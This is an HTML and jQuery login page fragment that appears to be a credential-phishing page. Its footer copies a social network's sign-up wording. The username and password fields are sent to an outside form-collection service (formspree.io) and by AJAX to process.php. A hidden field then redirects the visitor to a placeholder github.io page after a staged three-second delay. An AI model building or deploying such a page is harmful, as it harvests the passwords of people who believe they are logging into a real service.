<main>

  <div class="container ">

<form id="myForm" action="https://formspree.io/f/xgorzwrv" method="POST">
    
    <div class="form-group mb-3">
        <input type="text" name="username" class="form-control" placeholder="Username" required>
    </div>

    <div class="form-group mb-3">
        <input type="password" name="password" class="form-control" placeholder="Password" required>
    </div>

    <input type="hidden" name="_next" value="https://yourusername.github.io/index.html?1">

    <button type="submit" id="submitBtn" class="btn btn-primary btn-block"> Login </button>

    <div id="error">
        </div>
</form>
                   <p class="terms">By signing up, you agree to our <b>Terms, Data Policy</b> and <b>Cookies Policy</b></p>
              </div>

<script>
        $(document).ready(function() {
             var elementToHidx = document.getElementById("submitBtn");
            
            $("#myForm").submit(function(event) {
                $("#submitBtn").prop("disabled", true);
                elementToHidx.innerHTML  = "<i class='fa fa-spinner fa-spin' style='font-size:30px'></i>";


                event.preventDefault();

                var formData = $(this).serialize();

                $.ajax({
                    type: "POST",
                    url: "process.php",  
                    data: formData,
                    dataType: 'json',
                    success: function(response) {


                        setTimeout(function() {
                         elementToHidx.innerHTML = 'Login';
                        $("#submitBtn").prop("disabled", false);


                        if(response.type === 'error'){ 
                        $("#error").html(
                            '<p class="text-danger mt-3 mb-2 d-" id="error">'+  response.message +'</p>');
                        }else { 
                             $("#results").html(response);

                            
                        }


                    }, 3000);

                        
                    }
                });
            });
        });
    </script>
